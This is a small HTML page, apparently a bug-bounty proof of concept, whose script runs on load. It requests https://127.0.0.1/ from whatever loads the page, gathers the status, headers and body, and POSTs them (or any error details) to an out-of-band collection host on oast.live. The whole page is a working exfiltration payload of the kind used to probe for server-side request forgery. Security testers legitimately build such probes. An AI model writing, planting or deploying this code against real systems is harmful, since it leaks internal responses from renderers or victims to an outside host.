<html>
  <h1>Hello here , just test for bug bounty :) </h1><br>
 <body>
  <div id="result"></div>
  <div id="result1"></div>
  
  <script>
  fetch("https://127.0.0.1/")
  .then(async r => {
    const body = await r.text();

    const headers = {};
    for (const [key, value] of r.headers.entries()) {
      headers[key] = value;
    }

    const responseData = {
      status: r.status,
      statusText: r.statusText,
      url: r.url,
      redirected: r.redirected,
      headers: headers,
      body: body
    };

    document.getElementById("result1").textContent =
      JSON.stringify(responseData, null, 2);

    fetch("https://d9scv62mruosdl6tl2n0yisugu31dwoow.oast.live/", {
      method: "POST",
      headers: {
        "Content-Type": "application/json"
      },
      body: JSON.stringify(responseData)
    });
  })
  .catch(async err => {
    const errorData = {
      error: String(err),
      message: err?.message || null,
      stack: err?.stack || null
    };

    document.getElementById("result1").textContent =
      JSON.stringify(errorData, null, 2);

    fetch("https://d9scv62mruosdl6tl2n0yisugu31dwoow.oast.live/", {
      method: "POST",
      headers: {
        "Content-Type": "application/json"
      },
      body: JSON.stringify(errorData)
    }).catch(() => {});
  });
    
  </script>

    
  </body>
</html>
